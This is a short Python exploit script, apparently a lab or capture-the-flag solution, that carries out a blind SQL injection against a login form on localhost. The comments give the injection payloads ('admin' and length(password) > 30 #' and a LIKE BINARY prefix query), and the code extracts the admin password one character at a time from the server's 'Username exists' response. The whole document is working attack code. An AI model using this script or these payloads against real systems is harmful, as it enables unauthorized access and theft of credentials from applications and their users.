# Most simple blind SQL injection

# First, find the length of password by querying username as: "admin' and length(password) > 30 #"
# After several tries, we can find length(password) = 48

# Then, we can use: "admin' and password LIKE BINARY 'something%' #"

# Because of special characters like '%' and '_', remember to escape them when query

import requests
from string import printable, punctuation

url = 'http://localhost:1340/'

password = ''

def query(url, p):
    p += '%'
    p = 'admin\' and password LIKE BINARY \'%s\' #' % p
    myobj = {'username': p}
    x = requests.post(url, data = myobj)
    return 'Username exists' in x.text

for i in range(48):
    print('Current password = %s' % password)
    for c in printable:
        before = c
        if c in punctuation:
            c = '\\' + c
        tempPass = password + c
        if query(url, tempPass):
            password += before
            break

print('Last password = %s' % password)
